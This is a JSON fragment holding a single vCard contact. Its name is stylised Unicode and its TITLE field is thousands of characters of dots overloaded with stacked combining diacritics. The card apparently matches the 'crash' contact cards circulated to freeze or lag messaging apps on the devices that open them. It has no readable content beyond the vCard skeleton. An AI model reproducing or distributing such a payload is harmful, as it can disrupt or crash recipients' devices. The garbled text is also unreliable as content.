"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;🔥 𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ 🔥\nORG:\nTITLE:.̸̸̶̛̞̜͊̍̂͒̋̈̉ͭ̀͋͂́͟͜͜͢͜͡͡͡͏.̹͙̬̭̳͍̙̰̜̞͈ͨ̽̌ͨ̑̂̒̚҉̴̴̶̵̶̡͘͘͟͝͝͏̶̶̢̢̛̀͢.̶̡̨̛̞̮̙ͯ͂ͫ̀̆̍ͮ̆̓͛̅ͦ̽́̇̉̋͋̀̚̕͜͜͡͡.̴̢̗̘͕͍̖͉̮̱ͪ͋ͧͭͬ̌͗̓͐̀̚͠.̷̡͙̅̽̉̈́̏͋ͧ̕҉̸̴̡̧̧͢͢͡͞͏.̴̸̨̛̝̮̖͕̯͉̔̄̽ͥͭͬ̄̈́̍ͭ͑̆ͬ͐͜͝͡͞͝.̸̸̸̶̸̧̡̧̱̲̙̱̜̞̰̅̔͑͂ͧͬͬ͌̒̈́́͘͜͠͝.̸̴̷̵̡̢̝̟̯͎̘͓̘̀.̶̨̧̠͖̬̥̫͇̲̩̖̰̥͚̠̞̠̥̅͌̃́͟͠͝.̶̺̮̞̱̜͎̪ͭͤ̓̃̍͛̅ͤ̓̕͜҉͜.̨̢̮̣͍͙̦͇̺̞̅ͨ͒͌̑͋̅̍͒͑ͨ̃͒̕͝͞͝.̲͙̩̬͖̻̳͍͇̹̙̙ͦ̓ͥ̿̒͐ͥ̽̐ͪ̋̎̎̌̊̓ͨͨͬͅ͏̶.̵̬͇͇̻̮̜̹̰̭͓̲̻̻̘͖͎̟͖͇̀̃̄̐̑͑̓̕͢͟͡͝ͅ҉̛͡҉̀͟.̯̤̺̙̰̠͕̆̆͗͂҉̸̛.͙̜̂̀ͯ̓͗͑̈ͤ͐̋̔͑ͭ̄̄̃̋̀̀͢͏̶̴̵̨̡̛́̀̀̕͘͘͜͟͝͡.̶̛̜̺̥͙͉̼̱̪̰͍̫̗̻̀̀̀͘̕͘͘͢͟͢͟͟͟͜.̗̖̖̞̻̼̏̋͛͑͐ͪ҉̀͠͞͡͝.̷̶̧̧̧̘̠͇̒̓ͬ̓̃͒̇̏ͪ̓̈́͗̓͛͋̈͌ͨ̕͘̕͘͘͜͢͢͞͡͞͠.̷̵̜̣̟̺͍̳͕ͬͪ̌͛ͬ̿́̀̕͟҉҉̴̢̧͢.͕̙͍̖̮͉̣̥̑̃̐͗̂̀҉҉̸̴̢̛́̀́͘̕͢͝͠҉̵̴̕͘.̷̶̺̤̮͙͖̞͈̱̗͙͍͙̤͆͌ͮ̂̃ͪ̐͆̌͗ͬ͢͢͞͞ͅ.̴̷̧̧̛̫̰̮̳͚̤̟̪͔̖ͭ̄͑́́́̀͘̕̕͡.̪͙̦̎̓̀̕͜͏̷̢̛͜͢͢͞.̷̸̵̸̧̧̨̧̧̱̲̝͇̟̣̲̲͇͎̬͖͚̯̳ͯ̅̈́̓̐́͟͠.͇͇̟̣͖̞̥̟͖̞͇͉̳͉̎̌̽̓ͅ҉̷̴͘.̵̸̴̷̨̢̨̧̛̲͆̈̒̃̎̽ͯ͊ͮ͛ͯ̃̎̏͌̑ͬ̀̕͜͠.̴̣̘̺̺̤͙͙̼̠̘̭̱̰̪̙̤̋ͦ̑ͥ͗ͨͥ͂͒͋ͤͣͯ̑̽ͪ̄ͨͨ̚͢͟͏͏̢́͝͏̸̨̢̕͞.̣̠̦͓̠̟͔͖͚͔͙̖͇͎͕̰̟̎҉̷̶̴̷̢̨͟͏.̴̨̼̬̗̲͕ͣ̉͐͑̏̍ͩ͊́̚̕͝͞͞.̷̵̢̧̝̥̺͚̭̰͉̬͙͇̼͙̥̳͉͆̀́́͘͘͘͘͘̕͟͢͠͝ͅͅ.̯̩ͧ͐̎ͮ̓̽͛͌ͧ̎̌͋̈̏̌̆ͯͩ̏ͅͅ.̶̱̠̯̦͕̱̺̹̮̯͈͙̪̭͕̝̫̘̥̀ͤͮ̂̍ͤ̌̏̓͂̍̈̒͒̉̚͜͟ͅ͏͟.̛̯̗͇̘̲̬̥̙͍̔ͦͩͫ̒ͨ͆ͪ͌ͦ̀ͦͪ̐̈̒̌͋͊̏͟ͅ.̷̶̶̷̷̧̱̲̦̩͓͔̗̝̦͕̘͈͓̞̒͛ͧ̊ͫ́̕͟͟͢ͅ͏̸͜͜͜͢͞.̰̱̺͎͕̦̫̠͌̊͆̈́͐̀͘͜͟҉̷̀̀͟͠͏̴̴̧̡̢͘.̵̶̨̡̮̠̯͙̙͕͉̮̺ͪ̈͋͊̆̄͗̈́͟͟͜͝͞.̷̰͕̗̝͔̮̖̩̥͓̲́̀̕͟ͅͅ.̶̷̴̨̭̦̖̫̗͇͍̮̼͕̱̺͙̱̻̞̱͉ͯͥͤ́͊ͧ͂͗̏̌̒ͬ͋̓́́̚̕͠͝ͅ҉̶̷̧̛͘͢͢͜͡͠҉.̠̟̞̗̪͈̘̏͋̓͗ͨ͝҉̷̶̸̧̧͘͜͞͏̴́͜͠.̩͓̬͚̲̺̙͈͎̝̺͉̩̮̱͓̳̟̮̼ͧ͊̍̋͑ͪ̄͌҉̶̸̸̵̷̛́̀̀̀̕̕̕͡͏̕͘.̷̴̢̧̧̻̼̙̖̙̤̹̹̓̽͌̏̈́̄̊́̕͢͜͞ͅ.̴̵̯͈̮̝͎̮͎̬͈̙̘͚̠͊́̅̓̌̀̅̋̐͆̄ͦ͗̐͗͟͞҉̸͜͡͏̧́̀̕.̶̴̶̢̨̧̛̩̝̩̻͙̥̳̖̳͎͍̙̤̯̃̇͒ͣ̄̀͡͞͞͡͝.̴̶̶̢̧̢̡̧̛̱͈̭̦̼͔̤̯͖̱͇̜ͤ̉́̆ͩͫ͋̕͢͝͠͡ͅ.̼̯̞͈̯̠͍̯̥ͫ́͊̓ͩ͗͒͊̓͌̎͑̔́͆́̓͏̷̡̡͘͟͞͡.̢̬̪̖̬̱̗̦̬.̷̴̸̸̨̨̢̛̬̬͘͞͠͝.̸̪͔͕̞͋ͤ̏͂͏̷̢͘͠͠͏̡̢̢̛̀҉̧.̶̧̥̰̜͚͐̿ͦ̾̄ͯ́͘͟͠͡.̷̨̧̗͕̞̖͕͕̼̱̘̬͍̜̫̼͔̻̥͖̺̈ͦ̀̃ͥ͋̍͘͟͠͝҉͏̧̡̕͢.̴̴̛̩̅ͬ̂͗ͫͤ̓́̚͏̶̷̧̡̡̕̕̕͝͠.̷̵̵̧̢̥̻̬̱̭̰͈̠̫̣̟̱ͪ́̇̅͒ͦ͗ͧ̑̈́̉͢͜͠͠ͅ.̢͔̗̠̞̖̹̠͑͌ͭ̂̔̀͂͊̋̋̀̚̚҉̵̴̧̛́͘̕͘͜͞҉̨͘͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.͎ͫ̆̕҉̴̴́͟͏͜.̷̛̛̛̖̭̼̘̤̜̖̣ͥ̓̇͑̑͛̏̕͟͢͟͞͠͠.̵̻̞̳̪͉̘̤̣͉̘̣̦̬͙̖͟͝҉̵̸͟͢͠͝҉̸͏̨.̶̶̸̶̧̢͕͙̞̪̗̰ͥ̒̅ͣ̾͛ͭ͂̏͘͘͡҉̵̶̵̧̀҉̶͟.̧̢̛̟͉̞̭̱̯͕̘͗͐̔̓̊̄ͭ̉ͫ̚͘͟͜ͅ͏̷̵́͟͟͝͞͝.̷̶̷̛̰̲̘̬̍̉̔ͤͬͭ̔̓̄͑̊̌͑̄̓ͭ̾̏͒͒̕͞҉̵̵̧̛́̕͟͟͞.̸̸̷̸̢̧̡̛̛̹͍̦̝̼ͮ̄͛̄̀́́͝͡.̧͔͓̭̳̞͔̦̬̙̦̥̳̻͚̩̹̲̰̟͒̓̿̊͆̿̒̓̎.̟͙̦̼̯̥͔͚̹͚ͧ̏̄ͭ̀̓̑̇͆ͣ̅͊̚.̥̥̯̱̣̜͓̞̱̯ͨͣ̽̾ͨ́̀̕͞͝͏̶̴̡͜͜͏.̶̸̵̸̢̢̢͙̞̫͙̭̩͖̭͊̇̓͘͘͟͜͢͡͝.̶̹̖̥̩͚̬̝͕̙ͨ́͜͡҉̷.̷̵̈́̂̇͑̄ͫ͒́͋̕͟͟͠͞͠͏.̷̹̰̮̼̮͓̰̪̘͔͚̰͓͚̯̠̋͌ͧ͛ͭͭ̀̐͋ͣ͋̉̉̊͏̶.̴͉̙̪̝̙͕̣̦̲̫̼ͮͬ̊̃̓̍ͨͯ͑̋ͩ̊͛̕.̷̡̧̢̛̙͕͎̪̬̤͕ͤ͊͐ͤͩ̂̽̇ͪ͐̑ͮ̄̚͢͡͝.̶̡̧̨̛̦͖̝̖̹̺͓͈̜ͭͥ̒́̕͘͘͘͜͡͡͡͡͏̶.̡̘̮̗̻̣̱͍̖̦̩̟̝ͪ͐̓̄̓̔͟҉̷̢́͏̶̢̧̕͝.̷͇̼̻̺͔̻̩͚̣̖͖̝͙͓̺̾́̍͌̓ͭ̌ͨ̾͌̈̓́̂ͤ̉̚̚͡ͅͅͅ҉.̡̭̻̘̮̩̬̑̅̌ͧͨͬ́̾̔̓ͪ͆̍ͣͮͬ̀̚͞ͅ͏͏̵̡̛͜͞͠͏͜.͕͇̄̈̐̈́̀҉.͇͎̞̜̠̙͎̮̦̥̙͚̥͔̥̅͆ͭ͂̃̍ͪ̀.̶̴̵̶̶̧̛̻͖͇͙̳̲̟̱̜̞͔̬̥͈̠̳͍̱̜̮̌̓ͧ̓ͫ͛ͪ́̕҉̢̕͏̵͠͡.̶̨̜̦͓̤̟͚̣̪̦̞͕̤̙̾ͪ͗́́̃́͢͠͞.͇̪̇̃ͩ̿͌͊̐ͮ̋̐͊̑̚͟͟ͅ͏͏.̧̡̰͖̙͍͍͇̽͜͡.̵̸̡̧̛͚̞̼͕̞̠͖̙̭͚̥̪̥̳͛ͩ̄̇ͯͤ͐͆̔̈́͐ͮ͛̀͘̕͢͜͜͜͜͡͝͡ͅ҉͟͏.̸̷̡̢̨̧̯̦̻̳͌̿̆̌͋ͯ̀̏ͥ͛̐̊ͨ́̚̚̚̕͞҉̷̴͠҉̡.̶̨͈̅̈́͒ͣͦ͒̽ͪͮ̒̽͂́̈́ͫ̏̉͐̚͜͠.̷̡͉̙̪̥̰̳̰͚͍͐̎̉̇.͇͎͕̳̳͕̊̓͂͑ͧͬͯ̍ͧͩ̚҉̴҉̶̶̢̧̧̧̡̢̛̛̕͜͢͜͠͡.̢̠̿̃̾ͬͥͭ́̚.̴̴̴̸̢͈̰̖̞͚͉̲̰̮̙̳̮̞͇ͯͥͩͨ̒ͮ̅ͭ̓͗͌͆ͮ͂͂ͭ̋ͨ̾͊͘͘̕͢͠͠͡͞.̭̼͉̗͇̺̙̩̱̖̥̏͒͑̇̊̓ͯ͒̄̈́̇.͖͕̙͕̹̘̖̻̯͐̾͐̇͒̿ͧ͢͡҉̧̨.̖͕̞͈̣̯̬̮̫͈̠͖̘ͦ͑ͩ̏ͥ̀ͬ̎̃̔̓̆̅ͬ̀̚̕͢͡ͅ.̶̴̸̠͕̟̩̜̦͓̘̓́͌̌ͯ̌̆ͯͨ̈́̈́̎͂͆̀̚͘͜͟͏̵̴̵̨̢͢.̸̴̨̨̫̣͍̬͓͚͈̺̹̥̜̟̦̺̼̈ͨ́̓ͣͧ͗̇ͩ́͘̕͢͞͠͠͝ͅ͏̶̵̸̢.̶̡̱̖͚̘̩̝͙̣̺̦͇̠̝̠͈̯͉͓͙̟͌͊ͥ̒ͥ͋ͨ̇̌̈́ͭ̿̅̌ͪ́͘͠͡.̵̢̡̨̨̛̯̟̩̘̙̘̽̎̀̆̉̉͋ͣ́͌̊̂̾́͘͜͟͝͠͝͡͠.̷̡͔̩̝̼̬̪̰̜̼̯̠͍̻̼̥͇̑̋ͣ̏͋͟͡ͅ͏̴̶̶̡̢̡̧̧̢́̕͢͢͜͝.̵̛ͣ̾̊́̂͐̊̈ͫ̒̿͗͗͊̔̓͋͋͂͡͡.̗̭̼͍̹̯̞͈͎̯̼̗ͪ͒͒̌ͬ̈̃ͬ͊ͫͤͅ.̨̢ͨͪ̉͊̉ͪ̾̄ͮ͋ͣ̋̌́ͬ̅͗́ͯ͢.̷̴̴̷̶̡̨̢̛̠͔̮̭͚̝̰͌̌̏ͬ͒̀͑̉̂̒̽́̕͟͜͢͞͝͠͞҉.̵̵͔͑͆ͧ̓̓ͧͧ́.̴̡̨̛̮͖̥͎̜̗͔͎̪̙̪͐͐ͬ͌̇̌̓͋̎̂͛͑̆̄̐̐͊ͪ̀̀̕̕͝͡͠.̙̱̝͍̤̖̰̱̈́̆͗ͪͥ͑͆ͪ̄̎ͩ͂̒ͪ̈́͑̓̎̿̌̕͡҉͢͡҉̶̧̧̨̛͟͟͠͝͏̵͝.̴̢̨̙̼̖̟̫̲̘̥͇̇͘.̼̘̫̦̹͖̲̺̱͚̜̟̣̜͍̊́ͥ̔̇̓͒͒ͮ̉ͨͮͨ͗̐͛ͅ͏̸̵́͡.̦̤͙̰̝̯͇͈̟̻̝̟͕͚͇̗̲͍̾̆͆́̃ͬ̐̅̚͏̸̧̧̛́͘̕͘͘͜͠͞.̟͎͔̦̫͚ͦ.̷̷̶̰̙̩͎̞̟̬̣͕̻̟̳͈̰̽͐͛ͥͨ̾͛̊͆͒̒̅ͣ̾̊͑ͬ̐̒͘͟͟͟͠ͅͅͅ҉̕̕͘͏̸͠.̴̷̡̨̟̲̩̙͙̩̻̱̋ͅ͏͏̶͏͠.̭̥̙̖̹̩͔̼̞͉̣̱̭͗ͥ͂͒͊̏̐̃̏.̵̷̨̟̠̖̤̮͙̙̟̻̮͕̻̬͙͉̞̙̎͆ͮ́҉̸̡̛̀̕͘͜͟.̵̛ͩͧ̌̓ͮͮ̎͒̀͜͝.̸̶̬͈̻̖̜̳̹̜̯̯̖͚̝̟̪̻͔̳̃ͤ̓͌̒̾̀̚͢͟͠.̠͎̦͚̣̺̪̼͚̝̗͕̻͓ͬ̇̇ͧ̑̎͐͞.̷̴̴̵̴̴̭͕͓̥̫̜̹̼̞̗̈́ͨͧ̐̓̌ͬͫ̈̎̐͂̀̀͟͜͢.̵̨̡͈͉͙̺̭̝̪̖̱͆ͬ̅ͦ̋͂̌̂̽͛ͭ̓͛̓̽ͪͩ̇̈́͑͟͢͢͡͠.̶̵̢̢̡͉̖̺̲̫͎̣͇̙̯̰̬̰̩ͤ̏ͮͫͫ͊́̋ͯ̿̏̓̄̇̉ͦ̎̑ͦ́̕͟͟͞҉̛̀͘͞.̷̨̡̧̡̗̳̞͎̟͇̭̦̮̬̙̃̑̀̓̒̌ͨ̉̂ͩͮ̇́ͨ̈́̀̀̀́́̕̕͟͜͜͡͝͝.̖̬̫̹̪̜̠̦̹̤̹̪̋̔ͬ̎ͤ̓̋̊͛ͤ̑͋̚҉̴̵̷̶̡̡̛̀̕͘͟͟͡͡҉̨͘.̵̶̵̧̧̛̗̘͚̝͓̰̭̫͎̠̜͔̗̅͐̅̃̓͋̀ͨ́͘͟͟͜͠͡҉̵͜͝.̓ͫͦͫ̄ͨͬ̔͑̎̏̅̍͂́ͤ̚.̸̓͗ͪ͂ͮ̂̑ͮ̑̀̕̕̕͢҉̵̸̨҉.̸̷̳̟̓̿ͧ̂̄ͮ̽ͮ̄ͦ̃́͋̒̚͏̴̢́́͘͢͢͢͜͞͡͡͏.̶̸̢͚̂̋ͫͬ͊̋ͬ́͊͌̅̍̍̂͆̊̈̚͏̷̡̧̢͟.̵̧̦͔̽̿ͣ̿ͣ̈͂̀.̷̭̝̞͈̌̉̚ͅ͏̷̷̧̧̛́͘͢͠.͔̤̺͚̖̜̲̝͍̓ͤ̊ͨ̅͑̎͜ͅ͏.̸̶͇̣̭̬̭͓̏ͬ͊̿̕͠҉̷̡̢̛̀͘͟͏̴.̨͕ͩ̓͋̿͛̏ͤ͛̋͆ͤ.̳̪̫͉̺̥͇͚͔̝͕̭͈̹̳̩͈̂͠.̷̸̨͖̖͍͙̪̥͙̤̣͚̅ͥ̈̓ͥͩͦ̋ͦͯ̈ͣͧ̈́̕̕͏҉́.̖̋̒̒ͮ̈͐̂̍͊ͨͯ̅͒ͦͣ̒̃́̚͢͡͠͏̶̨͏̶̶̧̧͘̕͡͡͡.̵̥͈͈̘͉̗͔̘̰̱̟̗͖̳̺̭̫̱̰̬ͨ̓̐͂̾ͪ̂̄̓̄͋̔̎̑͟͏̕͏͘҉̡́͠͏̸̵͘͠.͈͉̪̲͚̠͓͖̼̟͚͛ͭͭͭ͂ͫ͑̈͑ͮͦ.̡̧̥̺̗͕̲̥͎͎͔̠̞̤̠̯͚̟̥̥̹ͫ͛ͧͧ̿̓ͫ̅́͝͏̸̷̸̵̢̢̛̀͢͜͟͠͡͞͡.̶̸̷̢̨̛͎̘̭̟̰̩̍̅ͣ͊ͫ̋̄͆̈̋̎̓̒ͩ͐͛ͤ̂́̀́̚͢͠͞.̸̸̶̡̛̥͚̹̩̱̮́ͫ̃ͩ͒̆ͧ͟͜͡҉̴͡.̺̟̥͙̼̆͋̍͛̌̂ͪ̀̈́̓̊̓́ͅ҉̕͢͢.̴̡̡̢̡͎̲ͮ̎͑ͧ͑ͫ̂ͬ̊͌͘͢͞.̸̴̶̶̡̬̤͈̹̰͌́ͨ̿ͨ͐̀̕͢҉̸̨̛̛́͜͜͞͡͠.̶̵̛̰͖̹̮͍̬̫̭̤̪̲͇̤̰̗͆̊̽̌̐̾ͪ̄̐̽̃ͤ͑̀͏͏̡̛̛͢͜͢͜͞͝͞.̷̸̨̢̨̖̘͊ͦ̑͐ͩͪ͝.̲̘̮̝͎̦̖̬́͟͏҉.̨̡̠̳͓̘̟̰͚̠̝̉ͣ͌͐̀̈ͯͨͣ̽̽̽ͫ̀̕͏͏̷͜.̸̨̛̛̪̍ͣ̒̿͛ͨ͗̂͛́̾̾̇́̿̚͘̕.ͨ̓ͥ͐͌ͣ̓̒̌̆͏̸̴̶̸̷̸̧̛̛͜͡.̸̧̡̢̛̤̘͖͈̱̫̭̯̬͔̞̻̯͎͙̝ͣ̏́̽̔ͯͤͪ̑ͥ́͘͜͟͠͝͝͡͏̨̛͝͡͞.̷͇̫̻̻̣̥̗̘̪͖̯̂ͨ͒̆̅̋͛͋̋̓̂́͛́̉̀̕͜͡͏̷̧͝.̸̛̥͇̟͕̳͈̜̟͖͎̬̼̤͎̠̓̓̌͗̔̉̽ͦ̍̇͗̇̈̅ͥ͛̒ͩ̾ͦ́́͜͝ͅ҉̵̵̢҉̵̸̴̵̡̛͜.̴̵̸̵̧͕͕̼̺͉̝̫̭̓ͯͮͫ͐̃̕͠҉͏̸̢͢͟͠͞͠.̵̷̡̜̻͕̭̽́ͯ͛͗̈̍͆ͮ̂̊͌͂ͬ̾ͤͧ̋ͦ͡ͅ.̖̠͔̘̲̳̍ͦ̾̊͟͠.̵̨̡̨̙̥̳̠̬̜̬̹̙͉̳͂͋́ͩ̐͋̈̈̽̓̃ͧ̀͠.̵̷̴̥̱̘̮̤͓̙̻̠̹̳̙̤͔̖͗̀͢͡͡͏̴̛͟͡҉̸̧͜͢.̶̵̻̘̤̽̇̃̏͊ͤ̒ͥͥ͂̂̈̊ͧ̌̀̚͠҉̸̧̢̕͘͟͟.̴̨̟̣͙̝̹̗͍̮͚̱͕̝̹̤̃͑ͪͦ͆͂ͥ̉̽̎̒̓̓̓̾̀͟ͅ͏̴͟͝͏͡͏̷҉̴̶̢̛̛́͜.̵̷̢̛̝͙͓͎̲̣̗̯̗̰͈̻̪͇̺̾͒́͘͘͢͜͠.̷̢̘̪͍̭̭̩̳͖̱̻̣̰̞͔̳͙̝̣͍̦̐̒̇̍ͩ̍ͦ̑̇͌́̾ͦ͌ͮͨ́́͘̕͝͠͝҉̸̴̛̛͝.̷̸̳͙̫̮̲͈̬͖̖̟̪͉̃͋ͨ̋̑͆̅͛̾͜͜͜͜͞͠.̵̷̴̢͍̺̺̦̓ͫ͂ͥ͂͠.̶̝̱̺͓̳̭̻̞̟̦̼̖̥͔͙̠͇̆͠҉̶̷̶̷̡̨̨̛͘͘͟͡͡.̵̵̶̙̳̜̤͇̜̟̯̠̗̤̥͖ͣ̉̅̈́̊ͫͧ͌̄̌ͭ͑ͤ̍̃ͪ̉̉ͫ̀͢.̷̮̼̳͓̪̘͉͚͇̳͖̬̺̭͎̈̒̊ͪͪ̋̂́̑͗ͮ̄̑ͮ͝ͅ͏.̶̷̧̻̙̙̮͖͍͋̇́ͭ͛ͩͫͧͫ̾ͮ̔̚͜.̶̜̾͂͐͆̿̎̽͏̡̀̕͘͢͟͞.͕̱͉̖̰̝̩̲̖͋̄̈́̐ͧ͂̌̀̅̉̆ͣ̓̎̄̑̌͏̛͏̴̸̶̴̴̨̨̛̛́͘͜͡͡͠.̴̵̮̼̺̣̺̩̭̱̞̻̺͙̊̃̃́͟͢.̡̧̧̛̛̠̳̩͓̝̭̠͈̠̰͖͔̯ͨͩͯͯ̋̔ͯ͂͆̾̾ͫ͆͑́́͘͘͘͢͟͜͟͠͠͝͡͠ͅͅ.̷̸̢̛̠̀ͩ̄ͩ̀́̀͜͡͞͝͞.̜̎̂̃͏̶̵̧́́͜͝.̵̖̩͉͎̟̮̰̪̼̪̱͒̿̓ͭ͆͛̆̓ͦͯͪ͒ͧͣ̅̆ͬ͝͡͡ͅ҉̶̷̨̢̡͘͢͟͞͠.̷̶̣̤̟̹̥͙͍̟̹̉͂ͯ͐̒̈́ͧ̐́ͧͣͬͤ͋͏̸̷̵̷̵̢̨̢͘͜͝͝͞͡͞.̸̸̻̞̭̓͌ͬ̿̈́͗̃̇̒̉̋̚͠͡͡.̶̷̴̡̛͖̪̝͕̲͍͎̣͙͈̦̹̫͎͓̖́̎́̀́͟͡҉҉.ͮͫ̽͏̵̴̸̢̨͜.͔̱̖͓̻͓͙̺͎̲͕͚̤͔̪̜̘̮͈̓̓ͭ̂̉̾͐̑̆ͩͯ͑̐̎.̸̶̲̦̙̹̘͔̞̭̙͎̲͖͕͚͖͔͙̭̫̻̄ͣͫͨ͂̂͜͜͜҉̶̧̢̧̕͟͠҉̸͘̕.̵̵̧̧̧̢̧͓̩̪̹͔̲͎͈̠̼͔̯̖̮̙͙͛̓ͮͪ̕͡.̢̧̹͕͉̝̫̟̬͎̩͚͙̬̰͖̗̳̳ͤͯͬ́ͨ̋ͣ̈̎ͣ̉̋̚͘ͅ҉҉̷͏̵̴̡̨̛͘͘͟͟͟͞͞.͕̞̬̜̞̥̩͙͚̔ͮ̓̃̍͗͊̃̿ͧ̋̉͆̑ͫ͋͐̈͠.̷̞̫̂ͩͧ̈͆̋ͬ͐͞҉̶̴̵̡́̕͢͢͝͡͞҉͟.̵̵̡̨̡͓̳̞̟̖͉̠̝͇͇̰̰̱̠̩̤̭͈͌̅̂́̄̿ͪ͟͝͡͝͠ͅ͏҉̸҉̶͠͞҉͡.̛̮̳̱̗̞͕̺̩͈̖͎̹͔̣̜̺̋͆̒̆̋̋͛͋̃̎̆ͦͣ͊.̳̘̱̭͛̓͂͊̓ͣ͊͌́͌̎̓͗̂̄ͧͨ̿̄ͧ.̸̰̩̤̟̱͖̭̱̞̰͇̟͋͛̄͂͊ͫͭ̈ͭͤ̔ͤ̐ͯ̈́͋̌͟ͅ͏҉̨͠.̧̛̣̭̣͍̩͎̻̫̗̖̟̖̮͖̑̇̅͑̂̆̉ͤ͑̅́͡͞.̵̴̨̨̨͚͚̘̜͚͚̲͎̪͈̥̱͓̰ͬ͛ͧ̑̌̌ͮ̈́͒ͭ̊̑̃́͑ͨ́́̕̕͜͟͝͞҉̶̨͡.̸̨̛̣͙͎͙̝̹͉͔̤ͯ̏͊̏͆̌ͩ̅̉͂̉̆̈́̿͋̄ͦ͞.̵̡̢̢̛̛͈̼̝̻̣̼̮̖͕͊̆̔́͟͝͏̷̶̴̨͘.̶̴̡̨̛̖͖̙̲̩̝͚̥͈̬̲͐̾͒̅̓̏̓͢͡͡.̷̧̟̳̺͕̬̦͚̳͎̮͓̤̟̙͖̮̩̮̀̉̈ͫ̓ͧͭ̚͟͝͏̷̸̀͘͞.̶̸̧͇̱̙̬̘̺̩̟̙͊ͩ̓ͩͭ͐̃̋̓͊̈͗͒̓̀̕͘͘͟͟͠͡ͅ҉̡́͞͏̵̵̢̧.̷̷̵̧̢̠̫̖̼̣͎̘̊̐̐͂ͭͧ̇ͣ̒́ͩ͆̚͏̛̀̕͜.̢̧͍̗̣̦̖̣͜ͅͅ͏̶̡͢͏̶̶́́͘.̵̻͓̺͍̺̜̦̟̽̅̈ͤ̂ͯ̓͋̂̇͜͏̨̛́͘͜.̵̷̸̡̨̢͉̟̣̖̑̍̿̉͂̄̏͐ͪ̀̕͟͞͡҉̸̷̨́͟͠.̶̵̡̧̨̛̛̤̳̎͛̾̉̀ͯ̿̌͗͌̎ͣ͂͒́͜͟͟͡͡ͅ.̤̺̣͕̣͙͚͚̫͎̉͆̃ͧ͆̽́ͥ̇ͩ̄̋ͧ̽ͣ̊̚̚ͅ҉̶̨̢̀҉̨͘.̷̷̸̥̫̬͉̭͖̙͍͓̣̞̤͖̙ͩͧͣ̏̉̃̔̊͐ͯͭ̾̒̅͟͞͏̶̴̡̀͞͡͞҉̵̴̡̛̛͠.̰̣̤͍̻ͪ̅ͥͯ̏̐̓̒̀.̴̵̟̩̱͚̼͇͉̗̫̣ͭ̈̌͞҉̷̶̸̵̀͜͠҉͠.̴̡̡̡͉̮̣̞̙̻̤̠̬͕͙̗͍̝͍ͣ̑̇̃ͭ̎̎̅ͮ̀̄̊̕͠.̻̗̜̗͎̘̲̣͖ͩ̓̄͂ͬ͑̓͆̓̅ͮ͊̀̚